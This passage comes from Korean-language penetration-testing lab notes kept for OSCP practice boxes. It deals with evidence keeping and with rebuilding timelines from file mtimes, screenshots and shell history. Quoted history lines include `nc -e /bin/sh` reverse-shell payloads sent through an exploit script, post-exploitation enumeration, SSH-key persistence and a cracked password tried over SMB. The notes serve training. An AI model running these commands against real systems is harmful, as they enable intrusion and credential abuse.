→ 보험: `-o resp_<단계>.html` 처럼 **파일명에 단계를 박아** 매 요청을 다른 파일로 받을 것. 같은 이름에 덮어쓰면 성공본이 실패본을 지우거나 그 반대가 됨.

**셸 «세션»이 통째로 사라지는 경우도 같은 항목임 — 그때 재확립 속도를 정하는 것은 「무엇이 파일로 남아 있는가」임.**

[[RubyDome]] — `local.txt` 확보 직후 침투가 중단되며 리버스셸 tmux 세션이 함께 소멸했고, **그 시점 이전의 화면도 같이 사라짐.** 3장·4장 터미널 블록이 전부 재구성으로 남은 이유임.
- 재확립을 가능하게 한 것은 앱 소스가 아니라 **`~/PG/RubyDome/rd.sh` 라는 파일 하나**였음. 대화형으로 curl 을 치고 있었다면 페이로드를 처음부터 다시 조립해야 했음
- `[가정]` **`app.rb` 실물은 Kali 에 저장되지 않았음** — 손에 쥐고 있었다면 파일로 남았어야 함. 그래서 앱 소스 블록이 재구성임
- 소멸 뒤 남은 것은 `err.html`·`pop.py`·`test.py`·`rev.py`·`rev2.py`·`rd.sh` 뿐이었고, **그 6개가 이 박스 서사의 전부를 지탱함**

**셸이 끊기는 것은 사고가 아니라 기본값임**(리버트·타임아웃·네트워크·재부팅). 대비 셋:
1. **익스플로잇을 스크립트로 만들어 둘 것.** 파일로 있으면 재확립이 한 줄임 — [[RubyDome]] 에서 실제로 작동한 유일한 대비책
2. **셸을 잡자마자 얻은 정보를 즉시 밖으로 옮길 것** — 사용자명·홈경로·앱 소스·`sudo -l` 출력·플래그. 노트에 붙여넣는 10초가 30분을 아낌
   ```bash
   cat /home/*/app/*.rb; sudo -l; id
   tmux capture-pane -t <세션> -p >> ~/PG/<박스>/shell.log
   ```
3. **지속성을 하나 심을 것.** 22/tcp 가 열려 있으면 `~/.ssh/authorized_keys` 가 리버스셸보다 훨씬 안 끊김. **보고서에 이 변경을 반드시 기록할 것**(C-5)

⚠️ **「확보한 정보는 즉시 옮긴다」에 «셸 출력»도 포함됨.** [[RubyDome]] 은 그 규율을 자기 노트에 적어놓고도 셸 출력에는 적용하지 못했음.

**⚠️ 그리고 «같은 파일명에 리다이렉트»하면 재실행이 첫 시도의 증거를 조용히 덮어씀.** [[Butch]] — `whatweb http://<IP>/450 > whatweb.txt` 를 정정하며 같은 파일에 다시 써서 **첫 시도의 응답이 남아 있지 않음.** `-oN`·`>` 파일명을 시도마다 다르게 둘 것(A-63 의 `resp_<단계>.html` 과 같은 규율).

#### A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명

**`~/.zsh_history` 에는 타임스탬프가 없음**(`extended_history` 미설정 시). 그래서 「무엇을 언제 했나」는 **① 산출물 mtime ② 스크린샷 파일명(`Pasted image <YYYYMMDDHHMMSS>.png`)** 두 축으로만 복원됨.

⚠️ **유보 둘을 항상 붙일 것** — ⓐ 스크린샷 파일명은 볼트에 **붙여넣은 시각**이라 촬영과 몇 초~몇 분 어긋날 수 있음 `[가정]` ⓑ **브라우저 웹 셸(Cockpit·Wetty 등) 안에서 친 명령은 `~/.zsh_history` 에 한 줄도 안 남음** — 그 구간의 실측은 스크린샷이 **유일**함(A-41 · C-3).

[[Cockpit]] 복원 예:

| 시각 | 무슨 일 | 근거 |
|---|---|---|
| 06-25 10:22–10:23 | nmap 완료 | `nmap.log` |
| 06-25 10:41 | `49390.py` 마지막 편집 — searchsploit 우회로의 끝 | `49390.py` mtime |
| 06-25 11:12 | 9090 ferox 중단(Ctrl-C) | `.state` mtime, 요청 66,771 / 예정 1,323,276 |
| 06-25 13:36 | 9090 ferox 마지막 회차 종료 — 200 응답 6,833건, 건진 것 0 | `ferox.txt` mtime·행수 |
| 06-25 15:32 | 1일차 80 ferox — 200 응답 **6건**, `login.php` **없음** | `ferox_80.txt` |
| 06-26 10:51 | 재배포된 IP 로 80 ferox 재시도 → `login.php` 발견 후 Ctrl-C | `.state` mtime·내용 |
| 06-26 10:53–10:55 | 로그인 우회, 사용자 목록, `'` 로 MySQL 에러 | 스크린샷 3장 |
| 06-26 11:07–11:08 | base64 디코딩 | 스크린샷 2장 + history |
| 06-26 11:11–11:13 | Cockpit 로그인, `local.txt` | 스크린샷 2장 |
| 06-26 11:13→13:01 | **약 108분 공백. 기록이 없음** | — |
| 06-26 13:01 | `sudo -l` | 스크린샷 |
| 06-26 13:36 | 권한상승 페이로드 1차 — 폐기 | 스크린샷(A-4-11) |
| 06-26 13:52 | root, `proof.txt` | 스크린샷 |

⚠️ **같은 시간대의 스크린샷이 전부 그 박스의 것은 아님** — 이 복원에서 `Pasted image 20260625135833.png`(CTF 참가 인증서)·`Pasted image 20260626142047.png`(Gerapy 로그인 화면)는 **무관한 스크린샷**으로 확인됐음. 파일명 시각만으로 묶지 말고 **내용을 열어 볼 것.**

**⛔ 히스토리는 시간순이 아님 — 붙어 있는 두 줄을 같은 세션·같은 시각으로 읽지 말 것.**
원인은 설정에 있음 — `~/.zshrc` 에서 `setopt share_history` 가 주석 처리돼 있고 `EXTENDED_HISTORY` 도 꺼져 있음. 그래서 `~/.zsh_history` 에 **타임스탬프가 한 줄도 없고**, 각 셸이 **종료할 때 자기 블록을 통째로 덧붙임.** 파일에 남는 순서는 「친 순서」가 아니라 **「셸이 죽은 순서」**임.

[[Jacko]] 실측 — `msfvenom … > rev.exe`(파일 mtime 16:46:50)가 `searchsploit -m 49384`(15:50:27)보다 **위**에 적혀 있음. msfvenom 세 줄이 `mkdir Jacko`·`nnmap` **앞**에 놓여 그대로 읽으면 15:37 이전이 되는데, 그랬다면 16:10 에 타겟이 받아간 것이 238KB 가 아니라 7,680B 여야 하므로 성립 불가.

⚠️ **`searchsploit -m` 의 사본 mtime = 「복사한 시각」이지 「원본 시각」이 아님.** 근거는 `searchsploit` 자신의 소스 — `cp -i` 이지 `-p` 가 아님:
```bash
┌──(kali㉿kali)-[~]
└─$ grep -n -B1 'Copied to' /usr/bin/searchsploit
958-        cp -i "${location}" "$( pwd )/"
959:        echo "Copied to: $( pwd )/$( basename ${location} )"
```
실제 원본은 2025-12-17 자임:
```bash
┌──(kali㉿kali)-[~]
└─$ ls -la --time-style=full-iso /usr/share/exploitdb/exploits/java/local/49384.txt
-rw-r--r-- 1 root root 125140 2025-12-17 09:16:42.000000000 +0900 /usr/share/exploitdb/exploits/java/local/49384.txt
```
**그래서 사본 mtime 은 「그 시각에 실제로 그 작업을 했다」의 1급 증거임.** [[Jacko]] 에서 이것이 「feroxbuster 가 도는 동안 다른 창에서 병행했다」를 확정해 줬음(A-18).

→ **기록 신뢰 순서 — 파일 mtime > 스크린샷 파일명 > 히스토리 순서.** 히스토리는 *무엇을 쳤는지*에는 1차 사료지만 *언제 쳤는지*에는 아님. 스크린샷 파일명도 **붙여넣기 시각**이라 캡처 시각과 어긋날 수 있음 — [[Jacko]] 에서 가장 강한 증거는 **화면 «안»에 시각이 찍힌** `http.server` 로그였음(파일명 16:10:44, 로그 16:10:29).

**스크린샷 파일명이 mtime 을 «이기는» 경우 — 두 값이 «다른 사건»을 가리킬 때.** 신뢰 순서는 같은 사건을 두 축으로 잴 때의 이야기임. 서로 다른 두 사건의 **선후**를 가릴 때는 각 축의 성질이 다름 — mtime 은 사건 시각 그 자체이고, 스크린샷 파일명은 사건의 **상한**임. **상한만으로도 선후가 확정되는 경우가 있음.**

[[pyLoader]] 실측 — 원 노트는 「두 익스플로잇 중 하나를 고르고 하나를 버렸다」로 적혀 있었으나 반증됨:

| 시각 | 사건 | 근거 |
|---|---|---|
| 10:45:55 → 10:46:49 | nmap 전수 스캔(54초) | `nmap.log` 헤더·푸터 원문 |
| 11:08:04 | `git clone` — `CVE-2023-0297.sh` 확보 | `CVE-2023-0297.sh` mtime |
| **11:11:00** | **root 셸 + `cat proof.txt` 가 한 화면에 담긴 스크린샷 붙여넣기** | `Pasted image 20260629111100.png` |
| 11:12:16 | `searchsploit -m 51532` — 두 번째 익스플로잇 확보 | `51532.py` mtime |
| 11:12:46 · 11:13:30 · 11:13:55 | searchsploit 화면 붙여넣기 ×3 | 스크린샷 파일명 |
| 11:14:31 · 11:14:57 | clone·배너 화면 붙여넣기 | 스크린샷 파일명 |

스크린샷은 캡처 뒤에만 붙여넣을 수 있고 캡처는 사건 뒤에만 가능함 → **root 획득은 11:11:00 «이전»**이고 `searchsploit -m` 은 그 뒤임. **[가정]** 붙여넣기 시각은 캡처 시각이 아님 — 같은 세션에서 clone 화면(사건 11:08:04)이 11:14:31 에 붙여져 **6분 지연**이 실측됨. 그러나 상한만으로도 `11:11:00 < 11:12:16` 이라 결론이 뒤집힘.
→ **프레임이 바뀜** — 「둘 중 하나를 골랐다」가 아니라 **「GitHub 판본으로 이미 root 를 잡은 뒤 exploit-db 판본을 참고용으로 받았다」**임. `51532.py` 는 「버렸다」가 아니라 **「돌려볼 필요가 없었다」**임.
→ **부수 근거 — 프롬프트의 작업 디렉터리도 순서를 말함.** `searchsploit` 을 친 프롬프트가 이미 `~/PG/pyLoader/CVE-2023-0297` 인데 그 디렉터리는 clone 이 만든 것임.


**[[plum]] 실측 — 「무엇을 했나」가 아니라 「무엇을 «안» 남겼나」가 드러남.**
복원 재료 셋: `~/PG/plum/` 파일 mtime · 볼트 스크린샷 파일명(`Pasted image 20260629HHMMSS.png`) · **타겟 메일함에 남은 `sudo` 실패 로그**.
```text
12:41:58  nmap 완료            nmap.log mtime
12:56:42  익스플로잇 클론       pluxml-rce/pluxml.py mtime
12:56:51  vi (읽기, 수정 없음)  디렉터리 mtime만 갱신 · git status 클린
12:59:32  익스플로잇 출력       스크린샷 125932·125939
13:00:31  www-data 셸 확인      스크린샷 130031
13:57:06  sudo -l 시도 #1 실패  메일 로그 Jun 29 04:57:06 (UTC)
14:08:58  local.txt 획득        스크린샷 140858
14:12:46  sudo -l 시도 #2 실패  메일 로그 Jun 29 05:12:46 (UTC)
14:21:05  find / -perm -u=s     스크린샷 142105
14:23:56  exploit-db 46996 확보  ~/PG/plum/46996 mtime
14:28:34  netstat -tulpn        스크린샷 142834
14:28:56  메일함 → root 자격증명 스크린샷 142856
14:29:47  root 획득             스크린샷 142947
```
**⚠️ 타임존을 먼저 정규화할 것.** 타겟은 EDT(UTC−4), Kali 는 KST(UTC+9)라 메일 로그가 9시간 어긋나 보임. 메일 헤더 `Mon, 29 Jun 2026 00:57:06 -0400` 과 본문 로그 `Jun 29 04:57:06`(UTC)은 **같은 순간**이고 KST 로는 13:57:06 임. 미환산이면 정합한 데이터를 「자기모순」으로 오독함 — 실제로 [[plum]] 에서 「mtime `Jun 29 01:12` 인 파일이 `05:12:46` 줄을 담고 있다」가 모순처럼 보였으나 `05:12:46 UTC = 01:12:46 EDT` 로 **완전 일치**였음.
**통념이 반증되는 지점** — 「SUID exim4 를 보고 삽질하느라 오래 걸렸다」는 서사가 타임스탬프로 무너짐. `46996` 확보(14:23:56)는 root 획득(14:29:47) **6분 전**이고 메일함 발견 뒤 root 까지는 **51초**였음. **진짜 손실은 13:00:31→13:57:06 의 57분**이고 그 구간에는 산출물이 **하나도 없음**(원인 미상, `[가정]` 조차 못 붙임).
→ **열거를 하면서 파일로 남길 것.** 그러면 사후 복원이 추측이 아니라 실측이 됨:
```bash
{ id; sudo -l; ls -la /var/spool/mail/ /var/mail/; ss -lntup; \
  find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; \
  cat /etc/crontab; } 2>&1 | tee /tmp/enum.txt
```
**파일 하나의 메타데이터가 도구 사용 이력을 말해줌.** [[plum]] 의 `~/PG/plum/46996` 은 `searchsploit -m` 산출물이 **아님** — Kali 재현으로 반증됨:

| | `searchsploit -m` 산출물 | `~/PG/plum/46996`(실제) |
|---|---|---|
| 파일명 | `46996.sh` | `46996`(확장자 없음) |
| 권한 | `-rwxr-xr-x` | `-rw-rw-r--` |
| 크기 | 3552 바이트 | 3557 바이트 |
| 내용 | — | `diff` 상 행말 공백 4곳 + 최종 개행이 더 있음 |

셋 다 브라우저/`curl` 다운로드의 특징임(`curl -o 46996 https://www.exploit-db.com/download/46996`). 대조군 — [[pyLoader]] 의 `51532.py` 는 `-rwxr-xr-x` 이고 `/usr/share/exploitdb/...` 원본과 바이트 단위 동일하며 스크린샷에 `Copied to: …` 줄까지 찍혀 있음(그쪽이 진짜 `searchsploit`). **보고서에 「이 도구를 썼다」고 적기 전에 산출물을 대조할 것.**


**⛔ 「히스토리에 없다 = 실행하지 않았다」가 아니다 — zsh 설정이 조용히 지운다.**

[[Heist]] 실측 — `hashcat.potfile` 에는 두 박스의 결과가 모두 들어 있다:
```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "^ANIRUDH|^ENOX" ~/.local/share/hashcat/hashcat.potfile | rev | cut -d: -f1 | rev
SecureHM
california
```
그런데 `~/.zsh_history` 에는 `hashcat -m 5600 hash.txt …` 가 **한 번만** 나온다. `~/.zshrc` 가 답이다:
```bash
┌──(kali㉿kali)-[~]
└─$ grep -iE "HISTSIZE|SAVEHIST|hist_" ~/.zshrc
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
```
두 박스에서 문자열이 동일한 명령을 쳤고 한 벌이 지워진 것으로 본다 `[가정]`.

히스토리가 빠짐없는 기록이 «아닌» 이유 셋:
- `hist_ignore_dups` — 직전과 같은 명령은 안 남음
- `hist_ignore_space` — **공백으로 시작한 명령은 통째로 안 남음**(비밀번호가 든 명령을 이렇게 감춤)
- `hist_expire_dups_first` + `HISTSIZE=1000` — 파일이 커지면 **중복부터** 사라짐

→ **부재를 미실행의 근거로 쓰지 말 것.** 결과물(potfile·`.state`·`nmap.log`·스크린샷)과 교차해야 확정된다. 이것은 A-64 의 「기록 신뢰 순서」를 **부재 판정 쪽으로** 확장한 것이고, `CLAUDE.md` §3 의 「부재 증거의 등급 상한은 `근거부족`」과 같은 선이다.

#### A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다

PG 인스턴스가 리버트/재배포되면 **IP 가 바뀜**([[Cockpit]]: `192.168.150.10` → `192.168.161.10`). 여러 IP 가 섞인 노트에서 하나로 뭉개면 **자기 산출물(스크린샷 URL 바 등)과 모순**이 생기고, 나중에 자기 기록을 의심하게 됨.

→ **노트에 IP 를 박을 때는 어느 세션·어느 시점의 것인지 함께 적을 것.** AD 박스에서 「자격증명이 갑자기 안 통함」의 원인 후보로도 같은 항목이 들어감(A-51 — [[Resourced]]·[[Hutch]] 도 노트 안에 두 IP 가 공존함).

**바뀌는 것은 IP 만이 아님 — 올려둔 파일이 통째로 증발함.** [[Zipper]] 는 작업이 이틀(7/13 → 7/14)에 걸쳤고 그 사이 타겟 IP 가 `192.168.164.229` → `192.168.103.229` 로, 업로드 아카이브 이름도 `upload_1783926987.zip` → `upload_1783991346.zip` 으로 바뀜. **웹셸은 리버트되면 증발함** — 시험 규정의 「재부팅/리버트 시 재현 필요」(E 절)가 실제로 발동한 사례임.
→ **페이로드 URL 을 노트에 통째로 적지 말고 「업로드 → 응답에서 파일명 확보 → 그 이름으로 조립」이라는 «절차»로 적을 것.** 타임스탬프가 박힌 URL 은 재사용 불가라는 것을 전제로 노트를 쓸 것.
→ 부수 대책 — 셸을 잡으면 `~/.ssh/authorized_keys` 추가 같은 재진입 경로를 확보해 두면 재작업 비용이 줄어듦(단 시험에서는 「남긴 흔적」 기록 의무와 함께 고려, C-5).

**인접 사례 — 「리버트로 IP 가 바뀌는 것」이 아니라 「앞 박스 IP 가 손가락에 남는 것」.**

[[Vault]] 실측 — 타겟은 `.172` 인데 `.175`([[Resourced]] 의 IP)를 친 명령이 `~/.zsh_history` 에 **6줄** 남아 있음:
```bash
enum4linux-ng -A 192.168.120.175
nxc smb 192.168.120.175 -u '' -p '' --shares
ldapsearch -x -H 'ldap://192.168.120.175' -s base namingcontexts
impacket-GetNPUsers vault.offsec/ -userfile users.txt -no-pass -dc-ip 192.168.120.175
nxc smb 192.168.120.175 -u 'anirudh' -p 'SecureHM' --shares
nxc-sweep 192.168.120.175 -u 'anirudh' -p 'SecureHM'
```
뒤의 두 줄이 특히 비쌈 — **크랙한 자격증명을 엉뚱한 박스에 던진 것**이라 「자격증명이 안 통한다」로 오독하기 딱 좋음(A-24 와 겹치는 함정). 나중에 `.172` 로 고쳐 다시 친 흔적이 히스토리에 그대로 있음.

→ **박스마다 `mkdir <박스>; cd <박스>; nnmap <IP>` 로 시작할 것.** `nmap.log` 가 그 디렉터리의 정답 IP 가 되어 잔류를 잡아 줌.
→ 같은 뿌리의 사고가 [[Heist]] 에도 있음.


**바뀌는 것은 IP 와 업로드 파일만이 아님 — 플래그 «값» 자체가 새로 만들어짐.**
[[Flu]] 실측 — 같은 `/home/confluence/local.txt` 인데 세션마다 값이 다름:
```text
1차 세션(2026-07-14, 192.168.103.41)  2d0c7239ce98c1add6986385f076c26e   ← 제출 완료
2차 세션(2026-08-20, 192.168.248.41)  52791694c2a6ccde2db0f566f81d084f
```
— 출처: 1차는 `파일보관\Pasted image 20260714142017.png`, 2차는 `~/PG/Flu/flag_evidence.txt`
1차 값은 그 인스턴스에서 이미 제출돼 유효했고, 지금 다시 넣으면 거부됨.
→ **플래그를 적어 두고 나중에 제출하려는 계획은 리버트 한 번에 무효가 됨. 읽으면 그 세션 안에 넣을 것.**
→ 부수 — **미제출 플래그를 「나중에 회수」하는 계획 자체가 성립하지 않음.** 다시 켜면 값이 달라지므로 박스를 처음부터 다시 풀어야 함.

**타겟 IP 와 LHOST 가 «둘 다 동시에» 낡을 수 있음.** [[Clue]] 는 06-15~06-22 작업 중 타겟 IP 가 세 번 바뀌었음 — `192.168.115.240`(06-15 nmap ~ 06-16 초반) → `192.168.178.240`(06-16 중반) → `192.168.239.240`(06-22, root 획득일). 죽은 IP 로 던진 명령이 그대로 남아 있음(`~/.zsh_history` 1135~1137행):
```text
python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.179 3000'
python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.196 3000'
python 47799.py 192.168.239.240 'nc -e /bin/sh 192.168.45.196 3000'
```
앞 두 줄은 박스가 이미 `.239.240` 이 된 뒤의 시도임. **타겟 IP 를 고치면서 LHOST 는 안 고치거나, 그 반대이거나** — 두 값이 서로 다른 이유로 낡기 때문에 한쪽만 고치는 사고가 남.
→ **둘 다 변수로 빼면 실수가 구조적으로 줄어듦:**
```bash
T=<타겟>; L=$(ip -br a show tun0 | awk '{print $3}' | cut -d/ -f1)
```

#### A-66. 조건을 바꾸는데 응답이 한 글자도 안 변한다

**조건 A·B·C 를 바꿔가며 던지는데 응답이 그대로면, 바꾸고 있는 조건이 아니라 «그 앞단»이 막고 있는 것임.** 요청이 그 조건을 판정하는 코드까지 도달조차 못 하고 있다는 뜻임.

[[Outdated]] 실측 — CVE-2022-36446 에서 슬래시 잘림 회피(base64) · `confirm=1` · `mode=new` 를 차례로 넣었으나 응답이 **다섯 번 연속 동일**했음. 셋 다 실제로 필요한 조건이었는데도 그랬음 — 진짜 벽은 그 앞의 `Referer` 검사였기 때문(A-15).

**인증 후 RCE 의 앞단 후보** — Referer/CSRF 체크 · 세션 만료 · 모듈 ACL · 리버스프록시.
**진단 순서** — ① 응답 «본문»부터 열 것(상태코드가 아니라) ② 의도적으로 **틀린 값**을 보내 응답이 달라지는지 볼 것. 틀린 값에도 응답이 같으면 그 파라미터는 아직 읽히지도 않는 것임.

#### A-67. blind 추출 결과를 믿기 전에 «완주했는가»부터 본다

**① 임계값 오판** — 추출 문자열에 깨진 글자가 섞이면 코드 버그가 아니라 **타이밍 오판**인 경우가 많음. `DELAY` 를 너무 짧게(0.2초) 잡으면 네트워크 지터(왕복 0.084초 + 서버 부하)와 구분이 안 돼 거짓 양성이 남. 반대로 5초면 정확하지만 236요청 × 절반이 5초 = 10분이 걸림.
- 균형점(실측, [[Pebbles]]) — `DELAY=0.6` · 판정 임계 `0.40`. 기준선(약 0.09초)과 sleep 사이에 임계가 있어 지터에 안전하면서 빠름
- 값이 흔들리면 조건당 **2~3회 재요청해 다수결**을 넣을 것(원 스크립트엔 없음)
- 그래도 안 되면 네트워크가 아니라 **주입이 실제로 안 되는 것**을 의심 — 주석 문자·따옴표 컨텍스트 재점검

**② 중단된 추출을 완주로 오독하지 말 것.** 스크립트가 완주 마커(`[+] RESULT:` 같은 것)를 찍게 짜고, **사후에 노트를 쓸 때 그 마커 유무로 완주/중단을 가릴 것.**

[[Pebbles]] 실측 — `~/PG/Pebbles/` 의 blind 산출물 8개 중 **넷이 마커 없이 끊겨 있었음**:

| 완주(`[+] RESULT:` 있음) | 중단(없음) |
|---|---|
| `dbs.out` · `zmusers.out` · `mysqluser.out` · `proof.out` | `tables.out` 30B · `crontab.out` 30B · `crontail.out` 62B · `dbphp.out` 64B |

`crontab.out` 은 10:30:34→10:35:55 로 약 5분을 태우고 30바이트(`# /etc/crontab: system-wide cr`)에서 끊겼음 — **문자당 약 10초.** 반면 32자 플래그는 2분 33초 안에 완주(10:22:33→10:25:06). **time-based 로 수백 바이트짜리 텍스트 파일을 통째로 뽑는 것은 시간 대비 소득이 없음** — 대상을 `GROUP_CONCAT`·`SUBSTRING` 오프셋으로 잘라 필요한 조각만 가져올 것.

⚠️ 그리고 **중단분을 근거로 「특이사항 없음」이라고 쓰면 안 됨.** 원 노트는 `crontab.out`/`crontail.out` 을 보고 「표준 데비안 crontab 헤더로 특이사항 없음」이라 적었으나, 실제로는 앞 30자와 꼬리 62자만 본 것이고 `/etc/cron.d/`·`/etc/cron.*` 는 아예 시도하지 않았음. **배제가 아니라 미완임**(A-19·D 절의 같은 선).

#### A-68. 작업이 «끊긴» 것을 실패로 적지 말 것 — 그리고 랩 측 티어다운은 게이트웨이 핑으로 확정한다

**「시도해서 실패했다」와 「시도 중에 끊겼다」는 다음 사람에게 전혀 다른 정보임.** 앞은 닫힌 문이고 뒤는 열려 있는 문임 — 섞어 적으면 다음 사람이 그 문을 다시 안 엶.

[[Monster]] 실측 — 권한상승 트리거를 찾던 중 **다른 박스(Flimsy) 기동으로 포털 동시 1대 슬롯 규칙에 걸려** Monster 인스턴스가 정지·리버트됐음. **기술적 실패도 조작 실수도 아닌 운영 결정**이었고 `pkill` 도 쓰지 않았음. 그래서 그 박스의 배제 목록(A-2-27)은 **전자**, 쓰기 가능한 `httpd.exe`·`mysqld.exe` 리드는 **후자**임.

**원인 계층을 핑 두 번으로 가름:**
```text
ping -c 2 -W 2 192.168.248.180      → 2 transmitted, 0 received, 100% packet loss
ping -c 1 -W 2 192.168.45.1         → 1 transmitted, 1 received, rtt 83.481 ms
```
`tun0` 는 살아 있고 VPN 게이트웨이가 83ms 로 답하는데 타겟만 `No route to host` → **VPN 문제가 아니라 랩 측 박스 티어다운**임. 리버스셸이 끊긴 순간 방화벽이나 자기 실수를 의심할 수 있었으나 **게이트웨이 핑 한 번이 원인을 박스 소멸로 확정해 줬음**(A-31 의 계층 분리와 같은 규율).

→ **살아 있는 인스턴스는 유한함.** 파생 규율 둘:
- **`whoami /all` 로 특권을 확인한 그 순간에 「가장 값싼 후보」가 아니라 「가장 그럴듯한 후보」부터** 때릴 것
- **긴 명령은 결과를 «파일로» 떨어뜨리고 던질 것.** [[Monster]] 의 7분짜리 전체 디스크 재귀 검색 결과는 스크롤백 저장 시점을 넘겨 **아예 남지 않았음.** 리버트로 타겟 디스크가 초기화되며 타겟에 만들던 `harv_out.txt` 도 함께 사라졌음(A-41 · C-2)

#### A-69. 산출물을 「정리」하다 실패의 증거를 지웠다

**정리 충동이 향하는 파일이 바로 시행착오 재료임.** 성공 산출물은 크고 뿌듯해서 안 지움. 지우고 싶어지는 것은 언제나 **작고, 비어 있고, 실패를 담은 파일**임.

[[Flimsy]] — 플래그를 다 따고 21:52 에 `~/PG/Flimsy/` 를 훑어보다 두 파일을 지웠음. **둘 다 「내용이 없어 보여서」 지웠고, 정확히 그래서 증거였음.**
- `shell443.log`(94바이트, nc 배너뿐) — 94바이트인 것 자체가 **`tee` 버퍼링 실패의 증거**(A-31). 셸은 붙었는데 배너 이후로 한 바이트도 안 늘었다는 뜻이므로
- `routes_after_cleanup.json`(0바이트) — 0바이트인 것 자체가 **정리 실패의 증거**(A-32). APISIX 가 응답을 안 해 삭제 후 라우트 목록을 받아올 수 없었다는 뜻이므로

**복원할 때도 「원본과 뭐가 다른지」를 같이 남겨야 인용할 수 있음.**

| 파일 | 복원 | 검증 | 원본과 다른 점 |
|---|---|---|---|
| `shell443.log` | 세션 기록에 남은 원문을 그대로 다시 씀 | `wc -c` = **94** — 원본과 같은 크기 | **mtime 이 21:55**(원본 21:26) |
| `routes_after_cleanup.json` | 0바이트로 재생성 | 크기 0 — 애초에 내용이 있었던 적이 없음 | mtime 만 21:55 |

- **`~/PG/<박스>/` 에서는 선별하지 말 것.** 통한 것은 성공 경로가 되고 안 통한 것은 시행착오가 됨 — 어느 쪽도 버릴 것이 아니므로 선별할 이유가 없음
- **0바이트 파일은 「빈 파일」이 아니라 「빈 응답을 받았다는 기록」임**
- **복원본을 인용할 거면 복원본이라고 밝힐 것.** mtime 하나가 어긋난 채로 실측인 척하면 그 노트의 다른 시각 기록까지 같이 의심받음(A-64)

→ 짝 항목은 A-63(무엇을 보냈는지 기록이 없다) — 저쪽은 **안 남긴 것**, 이쪽은 **남겼다가 지운 것**임.

#### A-6-10. 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다

**환경 정비로 «0 이 되는» 비용임 — 기술 문제가 아니므로 시험 중에 풀면 순손실임.**

[[Nagoya]] 실측 — `users.txt`(14:07)와 kerbrute 성공(14:36) 사이 **29분** 중 상당수가 사소한 경로 문제였음:
- `./username-anarchy -i /home/PG/Nagoya/names.txt` — `/home/kali` 누락 오타 → 재실행
- 생성된 `users.txt` 가 **도구 디렉터리에 떨어져** `mv users.txt ~/PG/Nagoya`
- `kerbrute userenum`(PATH 에 없음) → `kerbrute_linux_386`(**아키텍처 틀림**) → `kerbrute_linux_amd64`(성공, 세 번째)
- 그 사이 `kerbrute … usernames.txt` 로 **없는 파일명**을 준 시도도 있었음

→ 실제로 이 박스 도중 `export PATH="$HOME/git/username-anarchy:$PATH"` 를 `.zshrc` 에 추가해 해결했음. **시험 전에 자주 쓰는 도구의 PATH·아키텍처·출력 디렉터리를 미리 잡아둘 것.**
→ 같은 부류 — 별칭이 tmux 안에서 안 펼쳐지는 것(A-1-10), 워드리스트 경로 부재로 스캔이 0초에 죽는 것(A-1-10). **전부 「던지기 전에 `ls` 한 번」으로 끝남.**

---

**같은 부류 ④ — 비표준 포트를 «슬래시»로 붙임.** [[Butch]] 실측: `whatweb http://192.168.243.63/450` 은 80번의 `/450` **경로** 요청이지 450번 «포트»가 아님. 첫 시도가 통째로 헛돌았고, 정정판(`:450`)이 같은 파일을 덮어써 첫 시도의 응답도 남지 않았음(A-63).
```sh
whatweb http://192.168.243.63/450 > whatweb.txt   # ← 첫 시도. 잘못됨
whatweb http://192.168.243.63:450 > whatweb.txt   # ← 정정
```
— 출처: Kali `~/.zsh_history:2225`·`:2226`(두 줄이 연달아 있음). ⚠️ 소요 시간은 미상 — `~/.zsh_history` 에 타임스탬프가 없음(`EXTENDED_HISTORY` 미설정).

#### A-6-11. 박스 이름·호스트명이 증거 사슬을 대신하면 시험장에서 무너진다

[[MiddlewareBypass]] — 박스 이름이 `MiddlewareBypass`, 호스트명이 `nextjs`. `X-Powered-By: Next.js` 를 본 순간 「Next.js + 미들웨어 우회 = CVE-2025-29927」 이 즉시 성립하지만 **이건 랩이라서 성립하는 지름길임.** OSCP 시험 박스에는 이런 이름이 없음.

**이름을 전혀 쓰지 않고 같은 결론에 도달하는 사슬:**
```text
① X-Powered-By: Next.js                        → 프레임워크 확정
② /_next/static/chunks/pages/                  → Pages Router 확정
③ /unauthorized 페이지 존재                     → 차단 로직 존재
④ 보호 라우트가 307 + location: /unauthorized   → 앞단 인가 확정
⑤ Next.js + 앞단 인가                          → CVE-2025-29927 1순위
⑥ 헤더 한 줄로 검증                             → 정탐/오탐 확정
```
**①~⑥ 어디에도 박스 이름이 안 들어감** — 이 사슬을 몸에 붙이는 것이 박스를 푸는 것보다 값짐.

**반대 방향 교훈도 같이 남길 것 — 랩에서는 이름·호스트명·배너를 «적극» 활용해 시간을 아낄 것.** 학습 효율과 시험 대비는 다른 목표임. 다만 **「이름 덕에 풀렸다」를 노트에 명시해 두지 않으면 자기 실력을 과대평가한 채 시험장에 감.**

→ 일반화 — **정찰에서 얻은 힌트마다 「이게 시험장에도 있을 것인가」를 한 번 물을 것.** 없을 것이면 그 힌트가 없는 대체 경로를 같이 적어 둘 것.

#### A-6-12. 같은 파일의 플래그를 두 번 읽었는데 값이 다르다

**증상** — 같은 인스턴스처럼 보이는데 `proof.txt` 를 두 번 읽었더니 값이 다름.

[[Vault]] 실측 — 같은 파일(`C:\Users\Administrator\Desktop\proof.txt`)을 **17분 간격**으로 두 경로에서 읽었고 값이 달랐음:

| 붙여넣기 시각 | 경로 | 값 |
|---|---|---|
| 13:23:20 | GPO → evil-winrm Administrator | `714b4d1566a4bc88b9a0f45c33b36f0b` |
| 13:40:45 | utilman 치환 → RDP SYSTEM | `74a1ddd00c6d187cf4f787c14d5cbde1` |

두 값 모두 스크린샷 실측이고 한 글자씩 대조했음(`파일보관\Pasted image 20260708132320.png` · `…134045.png`). 그 사이에 인스턴스가 재시작·초기화됐다는 뜻이겠으나 **확정할 근거가 산출물에 없음** `[가정]`.

→ **플래그는 읽은 «그 순간에» 제출할 것.** 노트에 옮겨 적었다가 나중에 제출하면 이미 다른 값일 수 있음.
